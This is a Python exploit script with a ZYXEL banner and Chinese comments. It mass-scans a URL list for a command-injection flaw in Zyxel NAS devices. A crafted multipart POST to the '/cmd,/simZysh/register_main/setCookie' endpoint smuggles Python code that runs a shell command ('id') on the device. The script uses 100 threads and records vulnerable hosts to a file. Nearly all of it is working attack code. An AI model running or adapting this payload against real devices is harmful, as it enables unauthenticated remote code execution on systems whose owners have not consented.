import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

███████╗██╗   ██╗██╗  ██╗███████╗██╗     ███╗   ██╗ █████╗ ███████╗
╚══███╔╝╚██╗ ██╔╝╚██╗██╔╝██╔════╝██║     ████╗  ██║██╔══██╗██╔════╝
  ███╔╝  ╚████╔╝  ╚███╔╝ █████╗  ██║     ██╔██╗ ██║███████║███████╗
 ███╔╝    ╚██╔╝   ██╔██╗ ██╔══╝  ██║     ██║╚██╗██║██╔══██║╚════██║
███████╗   ██║   ██╔╝ ██╗███████╗███████╗██║ ╚████║██║  ██║███████║
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝                                                                                                                                                                                                                                                                                                                                                                                                              
                                                    version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/cmd,/simZysh/register_main/setCookie"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 ldwk',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=--------------------------0987654321',
        'Content-Length': '237'
    }
    data = (
        "----------------------------0987654321\r\n"
        'Content-Disposition: form-data; name="c0"\r\n'
        "\r\n"
        'storage_ext_cgi CGIGetExtStoInfo None) and False or __import__("subprocess").check_output("id", shell=True)#\r\n'
        "----------------------------0987654321--\r\n"
    )
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and  '"errmsg0": "OK"' in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()